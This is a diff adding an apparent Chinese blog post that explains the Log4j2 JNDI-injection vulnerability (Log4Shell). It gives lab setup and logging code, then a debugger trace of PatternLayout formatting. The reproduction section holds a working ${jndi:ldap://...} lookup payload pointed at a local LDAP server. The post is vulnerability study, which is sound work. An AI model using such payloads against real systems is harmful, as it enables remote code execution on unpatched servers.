@@ -1,0 +1,1226 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="基础开发 环境 jdk8u65 网上有很多说 jdk8u191 之后就不行了，其实不是的；高版本 jdk 是有绕过手段的。 Log4j2 2.14.1 CC 3.2.1 (最好是) 依赖 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 &lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-core&lt;/artifactId&gt; &lt;version&gt;2.14.1&lt;/version&gt;">
+<title>Log4j2漏洞原理</title>
+
+<link rel='canonical' href='https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/'>
+
+<link rel="stylesheet" href="/scss/style.min.4574748025b73b0369492ab661900878369bf003d477e5f5c673ee527faf3df7.css"><meta property='og:title' content="Log4j2漏洞原理">
+<meta property='og:description' content="基础开发 环境 jdk8u65 网上有很多说 jdk8u191 之后就不行了，其实不是的；高版本 jdk 是有绕过手段的。 Log4j2 2.14.1 CC 3.2.1 (最好是) 依赖 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 &lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-core&lt;/artifactId&gt; &lt;version&gt;2.14.1&lt;/version&gt;">
+<meta property='og:url' content='https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/'>
+<meta property='og:site_name' content='一个俗人'>
+<meta property='og:type' content='article'><meta property='article:section' content='Java' /><meta property='article:published_time' content='2025-02-19T14:32:47&#43;08:00'/><meta property='article:modified_time' content='2025-02-19T07:24:23&#43;00:00'/><meta property='og:image' content='https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/0.jpg' />
+<meta name="twitter:title" content="Log4j2漏洞原理">
+<meta name="twitter:description" content="基础开发 环境 jdk8u65 网上有很多说 jdk8u191 之后就不行了，其实不是的；高版本 jdk 是有绕过手段的。 Log4j2 2.14.1 CC 3.2.1 (最好是) 依赖 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 &lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-core&lt;/artifactId&gt; &lt;version&gt;2.14.1&lt;/version&gt;"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/0.jpg' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu7c49ec7d0c73aa09934b289b1d767e6f_13051_300x0_resize_box_3.png" width="300"
+                            height="302" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🤡</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">一个俗人</a></h1>
+            <h2 class="site-description">welcome two 一个俗人&#39;s 博客</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/gsygsr/gsygsr.github.io.git'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+                    
+                        <li id="i18n-switch">  
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
+                                
+                                    <option value="https://gsygsr.github.io/en/" >English</option>
+                                
+                                    <option value="https://gsygsr.github.io/" selected>中文</option>
+                                
+                                    <option value="https://gsygsr.github.io/ar/" >عربي</option>
+                                
+                            </select>
+                        </li>
+                    
+                
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#基础开发">基础开发</a>
+      <ol>
+        <li><a href="#环境">环境</a></li>
+        <li><a href="#代码实现">代码实现</a></li>
+        <li><a href="#实际开发场景">实际开发场景</a></li>
+      </ol>
+    </li>
+    <li><a href="#漏洞分析">漏洞分析</a>
+      <ol>
+        <li><a href="#影响版本">影响版本</a></li>
+        <li><a href="#漏洞原理">漏洞原理</a></li>
+        <li><a href="#漏洞复现">漏洞复现</a></li>
+        <li><a href="#debug代码调试">debug代码调试</a></li>
+        <li><a href="#小结调试">小结调试</a></li>
+      </ol>
+    </li>
+    <li><a href="#针对-waf-的常规绕过">针对 WAF 的常规绕过</a>
+      <ol>
+        <li><a href="#1-利用分隔符和多个--绕过">1. 利用分隔符和多个 <code>${}</code> 绕过</a></li>
+        <li><a href="#2-通过-lower-和-upper-绕过">2. 通过 lower 和 upper 绕过</a></li>
+        <li><a href="#3编码绕过">3.编码绕过</a></li>
+        <li><a href="#4-总结一些-payload">4. 总结一些 payload</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/java/java%E5%AE%89%E5%85%A8/log4j2/">
+                <img src="/java/java%E5%AE%89%E5%85%A8/log4j2/0_hu9956bd2b8819a55b37ccb90c62b2f008_204896_800x0_resize_q75_box.jpg"
+                        srcset="/java/java%E5%AE%89%E5%85%A8/log4j2/0_hu9956bd2b8819a55b37ccb90c62b2f008_204896_800x0_resize_q75_box.jpg 800w, /java/java%E5%AE%89%E5%85%A8/log4j2/0_hu9956bd2b8819a55b37ccb90c62b2f008_204896_1600x0_resize_q75_box.jpg 1600w"
+                        width="800" 
+                        height="448" 
+                        loading="lazy"
+                        alt="Featured image of post Log4j2漏洞原理" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="background-color: #2a9d8f; color: #fff;">
+                Java反序列化
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/java/java%E5%AE%89%E5%85%A8/log4j2/">Log4j2漏洞原理</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Feb 19, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 3 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="基础开发">基础开发
+</h2><h3 id="环境">环境
+</h3><ul>
+<li>jdk8u65</li>
+</ul>
+<p><font style="color:rgb(80, 80, 92);">网上有很多说 jdk8u191 之后就不行了，其实不是的；高版本 jdk 是有绕过手段的。</font></p>
+<ul>
+<li>Log4j2 2.14.1</li>
+<li>CC 3.2.1 (最好是)</li>
+</ul>
+<p>依赖</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl"> &lt;dependency&gt;
+</span></span><span class="line"><span class="cl">        &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
+</span></span><span class="line"><span class="cl">        &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;
+</span></span><span class="line"><span class="cl">        &lt;version&gt;2.14.1&lt;/version&gt;
+</span></span><span class="line"><span class="cl">    &lt;/dependency&gt;
+</span></span><span class="line"><span class="cl">    &lt;dependency&gt;
+</span></span><span class="line"><span class="cl">        &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
+</span></span><span class="line"><span class="cl">        &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;
+</span></span><span class="line"><span class="cl">        &lt;version&gt;2.14.1&lt;/version&gt;
+</span></span><span class="line"><span class="cl">    &lt;/dependency&gt;
+</span></span><span class="line"><span class="cl">    &lt;dependency&gt;
+</span></span><span class="line"><span class="cl">        &lt;groupId&gt;junit&lt;/groupId&gt;
+</span></span><span class="line"><span class="cl">        &lt;artifactId&gt;junit&lt;/artifactId&gt;
+</span></span><span class="line"><span class="cl">        &lt;version&gt;4.12&lt;/version&gt;
+</span></span><span class="line"><span class="cl">        &lt;scope&gt;test&lt;/scope&gt;
+</span></span><span class="line"><span class="cl">    &lt;/dependency&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="代码实现">代码实现
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">Logger logger = LogManager.getLogger(LongFunction.class);
+</span></span><span class="line"><span class="cl">        logger.trace(&#34;trace level&#34;);
+</span></span><span class="line"><span class="cl">        logger.debug(&#34;debug level&#34;);
+</span></span><span class="line"><span class="cl">        logger.info(&#34;info level&#34;);
+</span></span><span class="line"><span class="cl">        logger.warn(&#34;warn level&#34;);
+</span></span><span class="line"><span class="cl">        logger.error(&#34;error level&#34;);
+</span></span><span class="line"><span class="cl">        logger.fatal(&#34;fatal level&#34;);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/java/java%E5%AE%89%E5%85%A8/log4j2/1733813093505-1eadc89b-8b68-40f8-9e83-5bdc4f8ce2dc.png"
+	width="846"
+	height="136"
+	srcset="/java/java%E5%AE%89%E5%85%A8/log4j2/1733813093505-1eadc89b-8b68-40f8-9e83-5bdc4f8ce2dc_hu9e6e6ad90b2e5ce99d0da845dc5e524d_29810_480x0_resize_box_3.png 480w, /java/java%E5%AE%89%E5%85%A8/log4j2/1733813093505-1eadc89b-8b68-40f8-9e83-5bdc4f8ce2dc_hu9e6e6ad90b2e5ce99d0da845dc5e524d_29810_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="622"
+		data-flex-basis="1492px"
+	
+></p>
+<h3 id="实际开发场景">实际开发场景
+</h3><p><font style="color:rgb(80, 80, 92);">现在的代码是我们封装的一个行为，一般日志文件还是需要输出的。然后实际应用的话，是这样的。</font></p>
+<p><font style="color:rgb(80, 80, 92);">比如我从数据库获取到了一个 username 为 “Drunkbaby”，我要把它登录进来的信息打印到日志里面，这个路径一般有一个 /logs 的文件夹的。</font></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">       Logger logger = LogManager.getLogger(LongFunction.class);  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"> String username = &#34;Drunkbaby&#34;;  
+</span></span><span class="line"><span class="cl"> if (username != null) {  
+</span></span><span class="line"><span class="cl">            logger.info(&#34;User {} login in!&#34;, username);  
+</span></span><span class="line"><span class="cl"> }  
+</span></span><span class="line"><span class="cl">        else {  
+</span></span><span class="line"><span class="cl">            logger.error(&#34;User {} not exists&#34;, username);  
+</span></span><span class="line"><span class="cl"> }  
+</span></span><span class="line"><span class="cl">    }  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/java/java%E5%AE%89%E5%85%A8/log4j2/1733813253366-7d28fac4-a4da-4f97-b8bd-08bd730b222e.png"
+	width="917"
+	height="109"
+	srcset="/java/java%E5%AE%89%E5%85%A8/log4j2/1733813253366-7d28fac4-a4da-4f97-b8bd-08bd730b222e_hud356f77311ba5f2b9f98d66ef51baf29_14317_480x0_resize_box_3.png 480w, /java/java%E5%AE%89%E5%85%A8/log4j2/1733813253366-7d28fac4-a4da-4f97-b8bd-08bd730b222e_hud356f77311ba5f2b9f98d66ef51baf29_14317_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="841"
+		data-flex-basis="2019px"
+	
+></p>
+<h2 id="漏洞分析">漏洞分析
+</h2><h3 id="影响版本">影响版本
+</h3><p><font style="color:rgb(80, 80, 92);">2.x &lt;= log4j &lt;= 2.15.0-rc1</font></p>
+<h3 id="漏洞原理">漏洞原理
+</h3><p><img src="/java/java%E5%AE%89%E5%85%A8/log4j2/1733813388983-130041d0-9f96-4ca8-b07e-df8734bce32b.png"
+	width="584"
+	height="145"
+	srcset="/java/java%E5%AE%89%E5%85%A8/log4j2/1733813388983-130041d0-9f96-4ca8-b07e-df8734bce32b_hu0f424c4da169b4f6833e04c395f6f4bc_9829_480x0_resize_box_3.png 480w, /java/java%E5%AE%89%E5%85%A8/log4j2/1733813388983-130041d0-9f96-4ca8-b07e-df8734bce32b_hu0f424c4da169b4f6833e04c395f6f4bc_9829_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="402"
+		data-flex-basis="966px"
+	
+></p>
+<p>username是我们可控的</p>
+<p>尝试输入其他的</p>
+<p><code>username=&quot;${java:os}&quot;</code></p>
+<p><img src="/java/java%E5%AE%89%E5%85%A8/log4j2/1733813432071-d65b633c-7167-475e-96af-aa55a7eff8cf.png"
+	width="1136"
+	height="54"
+	srcset="/java/java%E5%AE%89%E5%85%A8/log4j2/1733813432071-d65b633c-7167-475e-96af-aa55a7eff8cf_hu6512dddc1d0d08b7a55d73f3e9b1ee5a_13724_480x0_resize_box_3.png 480w, /java/java%E5%AE%89%E5%85%A8/log4j2/1733813432071-d65b633c-7167-475e-96af-aa55a7eff8cf_hu6512dddc1d0d08b7a55d73f3e9b1ee5a_13724_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="2103"
+		data-flex-basis="5048px"
+	
+></p>
+<p>结果并不是直接输出<code>java:os</code>,而是输出了操作系统的一些信息</p>
+<p>而这里存在lookeup,从而导致JNDI注入漏洞</p>
+<h3 id="漏洞复现">漏洞复现
+</h3><p>用yakit开一个ldap服务</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">String name =&#34;${jndi:ldap://127.0.0.1:8085/XFaOTtBf}&#34;;
+</span></span><span class="line"><span class="cl">    if (name != null)
+</span></span><span class="line"><span class="cl">    {
+</span></span><span class="line"><span class="cl">        logger.info(&#34;User {} is logging&#34;,name);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    else
+</span></span><span class="line"><span class="cl">    {
+</span></span><span class="line"><span class="cl">        logger.error(&#34;User {} not exist&#34;,name);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    }
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/java/java%E5%AE%89%E5%85%A8/log4j2/1733813616917-c56430b7-5244-43c5-9e18-9146a00eec18.png"
+	width="1010"
+	height="692"
+	srcset="/java/java%E5%AE%89%E5%85%A8/log4j2/1733813616917-c56430b7-5244-43c5-9e18-9146a00eec18_huc7fab8967462f4dd4aa358b9636ff2a2_75493_480x0_resize_box_3.png 480w, /java/java%E5%AE%89%E5%85%A8/log4j2/1733813616917-c56430b7-5244-43c5-9e18-9146a00eec18_huc7fab8967462f4dd4aa358b9636ff2a2_75493_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="145"
+		data-flex-basis="350px"
+	
+></p>
+<h3 id="debug代码调试">debug代码调试
+</h3><p>断点打在<code>PatternLayout.toSerializable</code>下</p>
+<p><img src="/java/java%E5%AE%89%E5%85%A8/log4j2/1733816545661-dba550fa-17ce-4cc7-9211-c46c936e496d.png"
+	width="836"
+	height="318"
+	srcset="/java/java%E5%AE%89%E5%85%A8/log4j2/1733816545661-dba550fa-17ce-4cc7-9211-c46c936e496d_hued8d14dca2b5d859da075c8ca2a81349_47751_480x0_resize_box_3.png 480w, /java/java%E5%AE%89%E5%85%A8/log4j2/1733816545661-dba550fa-17ce-4cc7-9211-c46c936e496d_hued8d14dca2b5d859da075c8ca2a81349_47751_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="262"
+		data-flex-basis="630px"
+	
+></p>
+<p><font style="color:rgb(80, 80, 92);">往下走，先是一个循环，遍历 </font><code>formatters</code><font style="color:rgb(80, 80, 92);"> 一段一段的拼接输出的内容，不是很重要。</font></p>
+<p><font style="color:rgb(80, 80, 92);">两个传进去进行处理的变量，一个是 event，也就是我们 log4j2 需要来进行日志打印的内容；另外一个 buffer，我们会把打印出来的东西写进 buffer。</font></p>
+<p><font style="color:rgb(80, 80, 92);">跟进到</font><code>format</code><font style="color:rgb(80, 80, 92);">里后,调用栈里有两个format跟进的地方</font></p>
+<p><img src="/java/java%E5%AE%89%E5%85%A8/log4j2/1733816645439-8ee864f2-730a-4454-a811-a5eac433e500.png"
+	width="345"
+	height="75"
+	srcset="/java/java%E5%AE%89%E5%85%A8/log4j2/1733816645439-8ee864f2-730a-4454-a811-a5eac433e500_hu2e2137ae89f3db5762e05cd95f178ec4_7427_480x0_resize_box_3.png 480w, /java/java%E5%AE%89%E5%85%A8/log4j2/1733816645439-8ee864f2-730a-4454-a811-a5eac433e500_hu2e2137ae89f3db5762e05cd95f178ec4_7427_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="460"
+		data-flex-basis="1104px"
+	
+></p>
+<p>当i=7的时候会进到第二个format里</p>
+<p><img src="/java/java%E5%AE%89%E5%85%A8/log4j2/1733816730572-61128ffc-bf9f-4447-b4d7-314728d0a20a.png"
+	width="1001"
+	height="614"
+	srcset="/java/java%E5%AE%89%E5%85%A8/log4j2/1733816730572-61128ffc-bf9f-4447-b4d7-314728d0a20a_hu26ba50370da2a2a757d81f84a0ac23ff_104862_480x0_resize_box_3.png 480w, /java/java%E5%AE%89%E5%85%A8/log4j2/1733816730572-61128ffc-bf9f-4447-b4d7-314728d0a20a_hu26ba50370da2a2a757d81f84a0ac23ff_104862_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="163"
+		data-flex-basis="391px"
+	
+></p>
+<p><img src="/java/java%E5%AE%89%E5%85%A8/log4j2/1733816747555-4ae47bf8-83ca-49cc-ae17-e2d2bdda0bd1.png"
+	width="950"
+	height="193"
+	srcset="/java/java%E5%AE%89%E5%85%A8/log4j2/1733816747555-4ae47bf8-83ca-49cc-ae17-e2d2bdda0bd1_hua05d2783706e7bdb77076ca9cf833d55_38228_480x0_resize_box_3.png 480w, /java/java%E5%AE%89%E5%85%A8/log4j2/1733816747555-4ae47bf8-83ca-49cc-ae17-e2d2bdda0bd1_hua05d2783706e7bdb77076ca9cf833d55_38228_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="492"
+		data-flex-basis="1181px"
+	
+></p>
